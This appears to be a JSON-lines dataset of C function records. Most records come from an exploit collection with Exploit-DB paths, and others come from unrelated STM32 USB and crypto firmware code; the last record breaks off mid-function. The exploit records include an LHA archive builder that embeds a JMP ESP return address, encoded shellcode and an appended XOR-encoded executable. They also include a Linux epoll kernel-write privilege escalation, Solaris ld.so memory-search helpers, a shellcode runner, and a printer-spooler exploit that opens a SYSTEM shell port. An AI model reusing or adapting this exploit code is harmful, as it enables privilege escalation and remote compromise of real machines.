INVALID_HANDLE_VALUE)\n       {\n           printf(\"[-] Open file %s error!\\n\", ExeFile);\n               //__leave;            \n           exit(1);\n       }\n       \n       dwExeSize = GetFileSize(hAppend, 0);\n           \n       if(!dwExeSize)\n       {\n           printf(\"[-] Get AppendData  : %s size error!\\n\", ExeFile);\n           __leave;  \n       }\n           \n       printf(\"[+] Get ExeFile      : %s (size:%d).\\n\", ExeFile, dwExeSize);\n           \n       pAppend = (char *)malloc(dwExeSize);\n       if(!pAppend)\n       {\n           printf(\"[-] pAppend malloc buff error!\\n\");\n           __leave;\n       }\n       memset(pAppend, 0, dwExeSize);\n                   \n       if(!ReadFile(hAppend, pAppend, dwExeSize, &dwBytes, NULL))\n       {\n           printf(\"[-] ReadFile error!\\n\");\n           __leave;\n       }\n           \n       cExeXor = RandomC();\n       dwExeXor = cExeXor;\n       printf(\"[+] Exe Rand Xor Key : 0x%.2x\\n\", cExeXor);\n       for(i=0; i<dwExeSize; i++)\n       {\n          pAppend[i] ^= cExeXor;                \n       }\n           \n       /*\n       printf(\"hFile %lx, hAppend %lx\\n\", hFile, hAppend);\n       for(i=0;i<65535;i+=4)\n       {\n           \n          dwBytes = GetFileSize(i, 0);  \n          if(dwBytes != 0xFFFFFFFF) printf(\"%x   %d\\n\", i, dwBytes);  \n       }\n       */\n         \n       CloseHandle(hAppend);\n       hAppend=INVALID_HANDLE_VALUE;\n       \n       //memcpy(DirPath, RunSC, Sc_len);\n       printf(\"[+] Fill LHA & ShellCode ...\\n\");\n       \n       // Put LHAHeader\n       memcpy(pFile, LHAHeader, LH_LEN);\n       dwCount += LH_LEN;\n       \n       // Put FilePath (ret+nop)\n       memset(&FilePath, '\\x90', sizeof(FilePath));\n \n       //memcpy(&FilePath[RET_OFFSET], &RetAddr, 4);       // JMP ESP\n       memcpy(&FilePath[RET_OFFSET], &targets[iType].dwJMP, 4);\n       printf(\"[+] RET Addr         : 0x%lx \\n\", targets[iType].dwJMP);\n       \n       //memcpy(&FilePath[RET_OFFSET+4], &Decode, DC_LEN);\n       dwOffset = dwCount + RET_OFFSET + 4;\n       \n       \n       memcpy(pFile+dwCount, &FilePath, FILE_LEN);\n       dwCount += FILE_LEN;\n       \n       // Put LHAExtHeader\n       memcpy(pFile+dwCount, &LHAExt, LE_LEN);    \n       dwCount += LE_LEN;\n       \n       // Put DirPath (nop+ShellCode+nop)\n       memset(&DirPath, '\\x42', sizeof(DirPath));\n       \n       dwOffsetSize = dwCount + DIR_LEN + LEE_LEN + dwFileSize;\n       dwFileSize = dwOffsetSize + dwExeSize;\n           \n       printf(\"[+] File Size        : 0x%lx (%d) bytes\\n\", dwFileSize, dwFileSize);\n       printf(\"[+] Offset Size      : 0x%lx (%d) bytes\\n\", dwOffsetSize, dwOffsetSize);\n       printf(\"[+] ExeFile Size     : 0x%lx (%d) bytes\\n\", dwExeSize, dwExeSize);\n\n       printf(\"[+] Make Shellcode ...\\n\");    \n       Make_ShellCode();\n       \n       printf(\"[+] Encode Shellcode ...\\n\");\n       EncodeSc(RunSC, Sc_len, DirPath);\n       \n       \n       memcpy(pFile+dwOffset, &Decode, DC_LEN);\n       \n       memcpy(pFile+dwCount, &DirPath, DIR_LEN);\n       //memcpy(pFile+dwCount, \"ABCDEFGHIJKLMNOP\", 16);\n       dwCount += DIR_LEN;\n       \n       memcpy(pFile+dwCount, &LHAExtEnd, LEE_LEN);\n       dwCount += LEE_LEN;\n       \n       WriteFile(hFile, pFile, dwCount, &dwBytes, NULL);\n       printf(\"[+] Write LHAData    : %s (%d bytes)\\n\", szFile, dwCount);\n       \n       WriteFile(hFile, pAppend, dwExeSize, &dwBytes, NULL);\n       printf(\"[+] Write ExeData    : %s (%d bytes)\\n\", szFile, dwExeSize);\n       \n       dwFileSize = GetFileSize(hFile, 0);\n       printf(\"[+] FileSize         : %d bytes\\n\", dwFileSize);\n       printf(\"[+] All Done! Have fun!\\n\");\n   }\n\n   __finally\n   {        \n       if(hFile != INVALID_HANDLE_VALUE)\n           CloseHandle(hFile);\n           \n       if(hAppend != INVALID_HANDLE_VALUE)\n           CloseHandle(hAppend);\n           \n       if(pFile)\n           free(pFile);\n       \n       if(pAppend)\n           free(pAppend);\n   }\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/* establish pte pointing to virtual addr 'addr' */\n", "func_signal": "static int \nmap_pte(unsigned base, int pagenr, unsigned addr)", "code": "{\n\tunsigned *buf = alloca(pagenr * 4096 + 8);\n\tbuf[(pagenr) * 1024] = MKPTE(addr);\n\tbuf[(pagenr) * 1024+1] = 0;\t\n\tfixint((void *)buf);\n\treturn kwrite(base, (void *)buf, pagenr * 4096 + 4);\n}", "path": "platforms\\linux\\local\\25203.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/*\n * search_rwx_mem(): search for an RWX memory segment valid for all\n * programs (typically, /usr/lib/ld.so.1) using the proc filesystem\n */\n", "func_signal": "int search_rwx_mem(void)", "code": "{\n\tint\tfd;\n\tchar\ttmp[16];\n\tprmap_t\tmap;\n\tint\taddr = 0, addr_old;\n\n\t/* open the proc filesystem */\n\tsprintf(tmp,\"/proc/%d/map\", (int)getpid());\n\tif ((fd = open(tmp, O_RDONLY)) < 0) {\n\t\tfprintf(stderr, \"can't open %s\\n\", tmp);\n\t\texit(1);\n\t}\n\n\t/* search for the last RWX memory segment before stack (last - 1) */\n\twhile (read(fd, &map, sizeof(map)))\n\t\tif (map.pr_vaddr)\n\t\t\tif (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {\n\t\t\t\taddr_old = addr;\n\t\t\t\taddr = map.pr_vaddr;\n\t\t\t}\n\tclose(fd);\n\n\t/* add 4 to the exact address NULL bytes */\n\tif (!(addr_old & 0xff))\n\t\taddr_old |= 0x04;\n\tif (!(addr_old & 0xff00))\n\t\taddr_old |= 0x0400;\n\n\treturn(addr_old);\n}", "path": "platforms\\solaris\\local\\715.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n//  ????????\n//--------------------------------------------------------------------------------\n", "func_signal": "void showtype()", "code": "{\n   int i;\n\n   printf( \"[Type]:\\n\");\n   for(i=0;i<sizeof(targets)/sizeof(v);i++)\n   {\n       printf(\"\\t%d\\t0x%x\\t%s\\n\", i, targets[i].dwJMP, targets[i].szDescription);\n   }\n   printf(\"\\n\");\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n// ????\n//--------------------------------------------------------------------------------\n", "func_signal": "void RandFill(char *buf, int len)", "code": "{\n   int  i;\n   \n   for(i=0; i< len;i ++)\n   {        \n       buf[i] = RandomC();\n   }\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/*\n * search_ldso(): search for a symbol inside ld.so.1\n */\n", "func_signal": "int search_ldso(char *sym)", "code": "{\n\tint\t\taddr;\n\tvoid\t\t*handle;\n\tLink_map\t*lm;\n\n\t/* open the executable object file */\n\tif ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {\n\t\tperror(\"dlopen\");\n\t\texit(1);\n\t}\n\n\t/* get dynamic load information */\n\tif ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {\n\t\tperror(\"dlinfo\");\n\t\texit(1);\n\t}\n\n\t/* search for the address of the symbol */\n\tif ((addr = (int)dlsym(handle, sym)) == NULL) {\n\t\tfprintf(stderr, \"sorry, function %s() not found\\n\", sym);\n\t\texit(1);\n\t}\n\n\t/* close the executable object file */\n\tdlclose(handle);\n\n\tcheck_addr(addr - 4, sym);\n\treturn(addr);\n}", "path": "platforms\\solaris\\local\\715.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/* int    $0x80 */\n", "func_signal": "int main(void)", "code": "{\n\t\tfprintf(stdout,\"Length: %d\\n\",strlen(shellcode));\n\t\t((void (*)(void)) shellcode)();\n\t\treturn 0;\n}", "path": "platforms\\linux\\shellcode\\13732.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//Change it if size needed more to exploit you printer provider\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n  \n  unsigned char exploit[BOFSIZE];\n  unsigned char buffer[REQUIRED_SIZE];\n  DWORD dwSizeNeeded,n=0;\n  DWORD datalen=REQUIRED_SIZE;\n  LARGE_INTEGER dirs;\n  HANDLE hProcess;\n  DWORD write;\n  char *p,i;\n  #define lpLocalAddress dirs.LowPart\n  #define lpTargetAddress dirs.HighPart\n\n  printf(\"[+] Universal exploit for printer spooler providers\\n\");\n  printf(\"[+] Some Citrix metaframe, DiskAccess and Novel versions are affected\\n\");\n  printf(\"[+] Exploit by Andres Tarasco - atarasco@514.es\\n\\n\");\n\n  printf(\"[+] Connecting to spooler LCP port \\\\RPC Control\\\\spoolss\\n\");\n  \n\n \n  do {\n   dirs=ConnectToLPCPort();\n   printf(\"[+] Trying to locate valid address: Found 0x%8.8x after %i tries\\r\",lpTargetAddress,n+1);\n   if (lpLocalAddress==0){ \n\t printf(\"\\n[-] Unable to connect to spooler LPC port\\n\"); \n    printf(\"[-] Check if the service is running\\n\");\n\t exit(0);\n   }\n   i=lpTargetAddress>>24; // & 0xFF000000 == 0\n   n++;\n   if (n==MAXLOOPS) {\n      printf(\"\\n[-] Unable to locate a valid address after %i tries\\n\",n);\n      printf(\"[?] Maybe a greater REQUIRED_SIZE should help. Try increasing it\\n\");\n      return(0);\n   }\n  }while (i!=0);\n  \n  //printf(\" (%i tries)\\n\",n);\n  printf(\"\\n\");\n\n  printf(\"[+] Mapped memory. Client address: 0x%8.8x\\n\",lpLocalAddress);\n  printf(\"[+] Mapped memory. Server address: 0x%8.8x\\n\",lpTargetAddress);\n\n \n  i=(lpTargetAddress<<8)>>24;\n  //Fill all with rets. who cares where is it.\n  memset(exploit,i,sizeof(exploit)); \n  exploit[sizeof(exploit)-1]='\\0';\n\n  /*\n  memset(exploit,'A',sizeof(exploit)-1);\n  exploit[262]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess\n  exploit[263]= (lpTargetAddress<<8)>>24; //EIP for Diskaccess\n  exploit[264]='\\0';\n  */\n  \n  printf(\"[+] Targeting return address to  : 0x00%2.2X00%2.2X\\n\",exploit[262],exploit[262]);\n\n  p=(char *)lpLocalAddress;\n\n  memset(&buffer[0],0x90,REQUIRED_SIZE);\n  memcpy(&buffer[REQUIRED_SIZE -sizeof(shellcode)-10],shellcode,sizeof(shellcode));\n  \n  printf(\"[+] Writting to shared memory...\\n\");\n  if ( (hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()))!= NULL ) \n  {\n    if ( WriteProcessMemory( hProcess, p, &buffer[0], REQUIRED_SIZE, &write )!=0 )\n    {\n      printf(\"[+] Written 0x%x bytes \\n\",write);\n      printf(\"[+] Exploiting vulnerability....\\n\");\n      printf(\"[+] Exploit complete. Now try to connect to 127.0.0.1:51477\\n\");\n      printf(\"[+] and check if you are system =)\\n\");\n      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)exploit, 1, NULL, 0, &dwSizeNeeded, &n );\n      return(1);\n    } else {\n       printf(\"[-] Written 0x%x bytes \\n\",write);\n\n    }\n  } \n  printf(\"[-] Something failed. Error %i - Good luck next time\\n\",GetLastError());\n  return(0);\n}", "path": "platforms\\windows\\local\\3220.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n//  ??????\n//--------------------------------------------------------------------------------\n", "func_signal": "int TestIfIsValue(char *str)", "code": "{\n   if(str == NULL ) return(0);\n   if(str[0]=='-') return(0);\n   if(str[0]=='/') return(0);\n   return(1);\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/* real-mode interrupt table fixup - point all interrupts to iret.\nlet's hope this will shut up apm */\n", "func_signal": "static void\nfixint(char *buf)", "code": "{\nunsigned *tab = (void *) buf;\nint i;\n\n\tfor (i = 0; i < 256; i++)\n\t\ttab[i] = 0x0000400; /* 0000:0400h */\n\t/* iret */\n\tbuf[0x400] =0xcf; \n}", "path": "platforms\\linux\\local\\25203.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/*\n * set_val(): copy a dword inside a buffer\n */\n", "func_signal": "void set_val(char *buf, int pos, int val)", "code": "{\n\tbuf[pos] =\t(val & 0xff000000) >> 24;\n\tbuf[pos + 1] =\t(val & 0x00ff0000) >> 16;\n\tbuf[pos + 2] =\t(val & 0x0000ff00) >> 8;\n\tbuf[pos + 3] =\t(val & 0x000000ff);\n}", "path": "platforms\\solaris\\local\\715.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n//  ????\n//--------------------------------------------------------------------------------\n", "func_signal": "char RandomC()", "code": "{\n   DWORD dwRand;\n   char cRand;\n   \n   dwRand= rand();\n   cRand = dwRand%255+1;\n\n   return(cRand);\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/*\n * add_env(): add a variable to envp and pad if needed\n */\n", "func_signal": "int add_env(char *string)", "code": "{\n\tint\ti;\n\n\t/* null termination */\n\tif (!string) {\n\t\tenv[env_pos] = NULL;\n\t\treturn(env_len);\n\t}\n\n\t/* add the variable to envp */\n\tenv[env_pos] = string;\n\tenv_len += strlen(string) + 1;\n\tenv_pos++;\n\n\t/* pad the envp using zeroes */\n\tif ((strlen(string) + 1) % 4)\n\t\tfor (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {\n\t\t\tenv[env_pos] = string + strlen(string);\n\t\t\tenv_len++;\n\t\t}\n\n\treturn(env_len);\n}", "path": "platforms\\solaris\\local\\715.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/* write to kernel from buf, num bytes */\n", "func_signal": "static int \nkwrite(unsigned base, char *buf, int num)", "code": "{\n#define DIV 256\n#define RES 4\n\nint efd, c, i, fd;\nint pi[2];\nstruct epoll_event ev;\nint *stab;\nunsigned long ptr;\nint count;\nunsigned magic = 0xffffffff / 12 + 1;\n\n\tprintf(\"[+] kwrite base %p, buf %p,num %d\\n\", (void *)base,buf,num);\n\t/* initialize epoll */\n\tefd = epoll_create(4096);\n\tif (efd < 0)\n\t\treturn -1;\n\t\n\tev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP;\n\n\t/* 12 bytes per fd + one more to be safely in stack space */\n\tcount = (num+11)/12+RES;\n\n\t/* desc array */\n\tstab = alloca((count+DIV-1)/DIV*sizeof(int));\n\n\tfor (i = 0; i < ((count+DIV-1)/DIV)+1; i++) \n\t{\n\n\t\tif (socketpair(AF_UNIX, SOCK_DGRAM, 0, pi) < 0)\n\t\t\treturn -1;\n\n\t\tsend(pi[0], \"a\", 1, 0);\n\t\tstab[i] = pi[1];\n\t}\n\n\t/* highest fd and first descriptor */\n\tfd = pi[1];\n\t/* we've to allocate this separately because we need to have\n\tit's fd preserved - using this we'll be writing actual bytes */\n\tepoll_ctl(efd, EPOLL_CTL_ADD, fd, &ev);\n\t//printf(\"EPOLL_CTL_ADD count %u\\n\",count);\n\tfor (i = 0, c = 0; i < (count-1); i++) \n\t{\n\t\tint n;\n\t\tn = dup2(stab[i/DIV], fd+2+(i % DIV));\n\t\tif (n < 0)\n\t\t\treturn -1;\n\t\tepoll_ctl(efd, EPOLL_CTL_ADD, n, &ev);\n\t\tclose(n);\n\t}\n\n\t/* in 'n' we've the latest fd we're using to write data */\n\tfor (i = 0; i < ((num+7)/8); i++) \n\t{\n\t\t/* data being written from end */\n\t\tmemcpy(&ev.data, buf + num - 8 - i * 8, 8);\n\t\tepoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);\n\n\t\t/* the actual kernel magic */\n\t\tptr = (base + num - (i*8)) - (count * 12);\n\t\tstruct epoll_event *events =(struct epoll_event *)ptr;\n\t\t//printf(\"epoll_wait verify_area(%p,%p) addr %p %p\\n\",ptr,magic* sizeof(struct epoll_event) ,&events[0].events,magic);\n\t\tint iret =epoll_wait(efd, (void *) ptr, magic, 31337);\n\t\tif (iret ==-1)\n\t\t{\n\t\t\tperror(\"epoll_wait\");\n\t\t\tfatal(\"This kernel not vulnerability!!!\");\n\n\t\t}\n\t\t/* don't ask why (rotten rb-trees) :) */\n\t\tif (i)\n\t\t{\n\t\t\t//printf(\"epoll_wait verify_area(%p,%p) %p\\n\",ptr,magic* sizeof(struct epoll_event) ,magic);\n\t\t\tiret = epoll_wait(efd, (void *)ptr, magic, 31337);\n\t                if (iret ==-1)\n        \t        {\n                \t       perror(\"epoll_wait\");\n\t\t\t\tfatal(\"This kernel not vulnerability!!!\");\n\t\n        \t        }\n\n\t\t}\n\t}\n\n\tclose(efd);\n\tfor (i = 3; i <= fd; i++)\n\t\tclose(i);\n\t\n\treturn 0;\n\t\n}", "path": "platforms\\linux\\local\\25203.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/* make pme user can rw */\n", "func_signal": "static int \nmap_pme(unsigned base, int pagenr, unsigned addr)", "code": "{\n\tunsigned *buf = alloca(pagenr * 4096 + 32);\n\tbuf[(pagenr) * 1024] = MKPMD(addr);\n\tbuf[(pagenr) * 1024+1] = 0;\t\n\tbuf[(pagenr) * 1024+2] = MKPMD(addr)|0x00200000;\n\tbuf[(pagenr) * 1024+3] = 0;\t\n\tfixint((void *)buf);\n\treturn kwrite(base, (void *)buf, pagenr * 4096 + 4*3);\n}", "path": "platforms\\linux\\local\\25203.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "//--------------------------------------------------------------------------------\n// print shellcode\n//--------------------------------------------------------------------------------\n", "func_signal": "void PrintSc(char *lpBuff, int buffsize)", "code": "{\n   int i,j;\n   char *p;\n   char msg[4];\n\n   for(i=0;i<buffsize;i++)\n   {\n       if((i%16)==0)\n       {\n           if(i!=0)\n               printf(\"\\\"\\n\\\"\");\n           else\n               printf(\"\\\"\");\n       }\n\n       sprintf(msg, \"\\\\x%.2X\", lpBuff[i] & 0xff);\n\n       for( p = msg, j=0; j < 4; p++, j++ )\n       {\n           if(isupper(*p))\n               printf(\"%c\", _tolower(*p));\n           else\n               printf(\"%c\", p[0]);\n       }\n   }\n   printf(\"\\\";\\n\");\n}", "path": "platforms\\windows\\remote\\28235.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/**\n ** every leeto exploit MUST have dots in it\n**/\n", "func_signal": "void wait_dots( int s )", "code": "{\n        int i;\n\n        fprintf( stdout, \"[+] Sleeping %d secs to let squid restart\", s);\n\n        for ( i=0; i <= s ; i++ )\n        {\n                fflush( stdout );\n                fprintf(stdout, \".\");\n                sleep( 1 );\n        }\n\n        fprintf( stdout, \"\\n\" );\n}", "path": "platforms\\unix\\remote\\21297.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/*read /proc/cpuinfo to set  havepse*/\n", "func_signal": "static void \nread_proc(void)", "code": "{\n            FILE * fp;\n            char * line = NULL;\n            size_t len = 0;\n            ssize_t read;\n\t     printf(\"[+] try open /proc/cpuinfo ..\");\n            fp = fopen(\"/proc/cpuinfo\", \"r\");\n            if (fp == NULL)\n            {\n                 printf(\" failed!!\\n\");\n                 return;\n            }\n\t     printf(\" ok!!\\n\");\t\n\t\t \n\t     int cpus = 0;\t\n\t     int pse = 0;\n            while ((read = getline(&line, &len, fp)) != -1) \n\t\t{\n\n\t\t   if (strstr(line,\"flags\"))\n\t\t   {\n\t\t\tif(strstr(line ,\"pse \"))\n\t\t\t{\n\t\t\t\tpse ++;\n\t\t\t}\n\t\t   }\n\n            }\n\t     fclose(fp);\n\t\t \n            if (line)\n                 free(line);\n\t\t\t\n\t     if ( pse )\n\t\t{\n\t\t\t\tprintf(\"[+] find cpu flag pse in /proc/cpuinfo\\n\");\n\t\t\t\thavepse = 1;\n\t     \t}\n\n            return ;\n\n}", "path": "platforms\\linux\\local\\25203.c", "repo_name": "kylekirkby/Python-Exploit-Search-Tool", "stars": 35, "license": "None", "language": "c", "size": 32909}
{"docstring": "/**\n* @brief  SCSI_CheckAddressRange\n*         Check address range\n* @param  lun: Logical unit number\n* @param  blk_offset: first block address\n* @param  blk_nbr: number of block to be processed\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_CheckAddressRange (uint8_t lun , uint32_t blk_offset , uint16_t blk_nbr)", "code": "{\n  \n  if ((blk_offset + blk_nbr) > SCSI_blk_nbr )\n  {\n    SCSI_SenseCode(lun, ILLEGAL_REQUEST, ADDRESS_OUT_OF_RANGE);\n    return -1;\n  }\n  return 0;\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n* @brief  SCSI_ReadFormatCapacity\n*         Process Read Format Capacity command\n* @param  lun: Logical unit number\n* @param  params: Command parameters\n* @retval status\n*/\n", "func_signal": "static int8_t SCSI_ReadFormatCapacity(uint8_t lun, uint8_t *params)", "code": "{\n  \n  uint32_t blk_size;\n  uint32_t blk_nbr;\n  uint16_t i;\n  \n  for(i=0 ; i < 12 ; i++) \n  {\n    MSC_BOT_Data[i] = 0;\n  }\n  \n  if(USBD_STORAGE_fops->GetCapacity(lun, &blk_nbr, &blk_size) != 0)\n  {\n    SCSI_SenseCode(lun,\n                   NOT_READY, \n                   MEDIUM_NOT_PRESENT);\n    return -1;\n  } \n  else\n  {\n    MSC_BOT_Data[3] = 0x08;\n    MSC_BOT_Data[4] = (uint8_t)(blk_nbr - 1 >> 24);\n    MSC_BOT_Data[5] = (uint8_t)(blk_nbr - 1 >> 16);\n    MSC_BOT_Data[6] = (uint8_t)(blk_nbr - 1 >>  8);\n    MSC_BOT_Data[7] = (uint8_t)(blk_nbr - 1);\n    \n    MSC_BOT_Data[8] = 0x02;\n    MSC_BOT_Data[9] = (uint8_t)(blk_size >>  16);\n    MSC_BOT_Data[10] = (uint8_t)(blk_size >>  8);\n    MSC_BOT_Data[11] = (uint8_t)(blk_size);\n    \n    MSC_BOT_DataLen = 12;\n    return 0;\n  }\n}", "path": "lib\\USB_Device\\Class\\msc\\src\\usbd_msc_scsi.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  EP0_TxSent\n  *         Handles the DFU control endpoint data IN stage.\n  * @param  pdev: device instance\n  * @retval status\n  */\n", "func_signal": "static uint8_t  EP0_TxSent (void  *pdev)", "code": "{\n  uint32_t Addr;\n  USB_SETUP_REQ req;  \n  \n  if (DeviceState == STATE_dfuDNBUSY)\n  {\n    /* Decode the Special Command*/\n    if (wBlockNum == 0)   \n    {\n      if ((MAL_Buffer[0] ==  CMD_GETCOMMANDS) && (wlength == 1))\n      {}\n      else if  (( MAL_Buffer[0] ==  CMD_SETADDRESSPOINTER ) && (wlength == 5))\n      {\n        Pointer  = MAL_Buffer[1];\n        Pointer += MAL_Buffer[2] << 8;\n        Pointer += MAL_Buffer[3] << 16;\n        Pointer += MAL_Buffer[4] << 24;\n      }\n      else if (( MAL_Buffer[0] ==  CMD_ERASE ) && (wlength == 5))\n      {\n        Pointer  = MAL_Buffer[1];\n        Pointer += MAL_Buffer[2] << 8;\n        Pointer += MAL_Buffer[3] << 16;\n        Pointer += MAL_Buffer[4] << 24;\n        MAL_Erase(Pointer);\n      }\n      else\n      {\n        /* Reset the global length and block number */\n        wlength = 0;\n        wBlockNum = 0;     \n        /* Call the error management function (command will be nacked) */\n        req.bmRequest = 0;\n        req.wLength = 1;\n        USBD_CtlError (pdev, &req);\n      }\n    }\n    /* Regular Download Command */\n    else if (wBlockNum > 1)  \n    {\n      /* Decode the required address */\n      Addr = ((wBlockNum - 2) * XFERSIZE) + Pointer;\n      \n      /* Preform the write operation */\n      MAL_Write(Addr, wlength);\n    }\n    /* Reset the global lenght and block number */\n    wlength = 0;\n    wBlockNum = 0;\n    \n    /* Update the state machine */\n    DeviceState =  STATE_dfuDNLOAD_SYNC;\n    DeviceStatus[4] = DeviceState;\n    DeviceStatus[1] = 0;\n    DeviceStatus[2] = 0;\n    DeviceStatus[3] = 0;\n    return USBD_OK;\n  }\n  else if (DeviceState == STATE_dfuMANIFEST)/* Manifestation in progress*/\n  {\n    /* Start leaving DFU mode */\n    DFU_LeaveDFUMode(pdev);\n  }\n  \n  return USBD_OK;\n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  DFU_Req_GETSTATE\n  *         Handles the DFU GETSTATE request.\n  * @param  pdev: device instance\n  * @retval None\n  */\n", "func_signal": "static void DFU_Req_GETSTATE(void *pdev)", "code": "{\n  /* Return the current state of the DFU interface */\n  USBD_CtlSendData (pdev, \n                    &DeviceState,\n                    1);  \n}", "path": "lib\\USB_Device\\Class\\dfu\\src\\usbd_dfu_core.c", "repo_name": "vanbwodonk/STM32F4_USB_MP3", "stars": 41, "license": "None", "language": "c", "size": 808}
{"docstring": "/**\n  * @brief  Encrypt and decrypt using TDES in CBC Mode\n  * @param  Mode: encryption or decryption Mode.\n  *           This parameter can be one of the following values:\n  *            @arg MODE_ENCRYPT: Encryption\n  *            @arg MODE_DECRYPT: Decryption\n  * @param  Key: Key used for TDES algorithm.\n  * @param  InitVectors: Initialisation Vectors used for TDES algorithm.\n  * @param  Input: pointer to the Input buffer.\n  * @param  Ilength: length of the Input buffer, must be a multiple of 8.\n  * @param  Output: pointer to the returned buffer.\n  * @retval An ErrorStatus enumeration value:\n  *          - SUCCESS: Operation done\n  *          - ERROR: Operation failed\n  */\n", "func_signal": "ErrorStatus CRYP_TDES_CBC(uint8_t Mode, uint8_t Key[24], uint8_t InitVectors[8],\n                          uint8_t *Input, uint32_t Ilength, uint8_t *Output)", "code": "{\n  CRYP_InitTypeDef TDES_CRYP_InitStructure;\n  CRYP_KeyInitTypeDef TDES_CRYP_KeyInitStructure;\n  CRYP_IVInitTypeDef TDES_CRYP_IVInitStructure;\n  __IO uint32_t counter = 0;\n  uint32_t busystatus = 0;\n  ErrorStatus status = SUCCESS;\n  uint32_t keyaddr    = (uint32_t)Key;\n  uint32_t inputaddr  = (uint32_t)Input;\n  uint32_t outputaddr = (uint32_t)Output;\n  uint32_t ivaddr     = (uint32_t)InitVectors;\n  uint32_t i = 0;\n\n  /* Crypto structures initialisation*/\n  CRYP_KeyStructInit(&TDES_CRYP_KeyInitStructure);\n\n  /* Crypto Init for Encryption process */\n  if(Mode == MODE_ENCRYPT) /* TDES encryption */\n  {\n    TDES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Encrypt;\n  }\n  else\n  {\n    TDES_CRYP_InitStructure.CRYP_AlgoDir = CRYP_AlgoDir_Decrypt;\n  }\n  TDES_CRYP_InitStructure.CRYP_AlgoMode = CRYP_AlgoMode_TDES_CBC;\n  TDES_CRYP_InitStructure.CRYP_DataType = CRYP_DataType_8b;\n\n  CRYP_Init(&TDES_CRYP_InitStructure);\n\n  /* Key Initialisation */\n  TDES_CRYP_KeyInitStructure.CRYP_Key1Left = __REV(*(uint32_t*)(keyaddr));\n  keyaddr+=4;\n  TDES_CRYP_KeyInitStructure.CRYP_Key1Right= __REV(*(uint32_t*)(keyaddr));\n  keyaddr+=4;\n  TDES_CRYP_KeyInitStructure.CRYP_Key2Left = __REV(*(uint32_t*)(keyaddr));\n  keyaddr+=4;\n  TDES_CRYP_KeyInitStructure.CRYP_Key2Right= __REV(*(uint32_t*)(keyaddr));\n  keyaddr+=4;\n  TDES_CRYP_KeyInitStructure.CRYP_Key3Left = __REV(*(uint32_t*)(keyaddr));\n  keyaddr+=4;\n  TDES_CRYP_KeyInitStructure.CRYP_Key3Right= __REV(*(uint32_t*)(keyaddr));\n  CRYP_KeyInit(& TDES_CRYP_KeyInitStructure);\n\n  /* Initialization Vectors */\n  TDES_CRYP_IVInitStructure.CRYP_IV0Left = __REV(*(uint32_t*)(ivaddr));\n  ivaddr+=4;\n  TDES_CRYP_IVInitStructure.CRYP_IV0Right= __REV(*(uint32_t*)(ivaddr));\n  CRYP_IVInit(&TDES_CRYP_IVInitStructure);\n\n  /* Flush IN/OUT FIFO */\n  CRYP_FIFOFlush();\n\n  /* Enable Crypto processor */\n  CRYP_Cmd(ENABLE);\n\n  for(i=0; ((i<Ilength) 